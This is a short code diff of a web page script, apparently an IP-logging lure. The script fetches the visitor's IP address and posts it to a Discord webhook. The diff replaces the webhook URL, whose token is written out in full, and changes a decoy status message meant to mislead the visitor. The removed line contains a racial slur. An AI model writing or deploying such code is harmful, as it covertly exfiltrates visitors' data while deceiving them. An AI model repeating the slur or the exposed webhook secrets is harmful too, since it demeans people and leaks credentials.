@@ -42,7 +42,7 @@
         const ipData = await ipResponse.json();
         const userIP = ipData.ip;
 
-        const webhookUrl = 'https://discordapp.com/api/webhooks/1331408629911519383/jToH8jWjS2QTjnKO9e3mMrnxKDOD-ALdC6OL6B6PsRPIC1TqZKrV4E0D17s0xHuxqrmM';
+        const webhookUrl = 'https://discord.com/api/webhooks/1332888766490349678/MW70wO-ZgxR6hAWy3RBLW1eusKfkn6m_wfBGkhwYCzxvrwXgUPTawDnZmpvTdb_fEMnY';
         const response = await fetch(webhookUrl, {
           method: 'POST',
           headers: {
@@ -54,7 +54,7 @@
         });
 
         if (response.ok) {
-          status.textContent = 'NiggaBin is Under Maintenance Please Try Again Later!';
+          status.textContent = 'No codes are up rn, or could not load on ur brower!';
           status.style.color = 'red';
         } else {
           status.textContent = 'Failed to process your information. Please try again later.';
